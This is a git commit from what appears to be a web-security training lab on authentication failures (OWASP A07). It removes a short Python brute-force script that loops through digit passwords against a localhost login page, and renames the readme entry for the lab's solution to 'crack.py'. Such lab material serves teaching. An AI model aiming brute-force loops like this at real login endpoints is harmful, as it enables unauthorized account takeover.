a46f17128a4db02c02dd4bb759b0a1c85dc4269b
Kin Ip Mong <jamesmong96@gmail.com>
2022-08-04 14:09:59 +0100

    update brute force script

--- helper/A07_brute_force_scripts/loop1_pass.py
+++
@@ -1,7 +0,0 @@
-import requests
-characters = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
-for a in characters:
-  temp = requests.post('http://localhost/A07-authenticationFailure/login.php', data={'username': '5d', 'password': a})
-  if "Incorrect password" not in temp.text:
-    print('Possible password: '+a)
-    exit()
--- helper/readme.md
+++ helper/readme.md
@@ -3,5 +3,5 @@
 ## populateUsers.php
 Useful when populating a large amount of dummy user data
 
-## A07_brute_force_scripts
+## crack.py
 The solution for A07 brute force
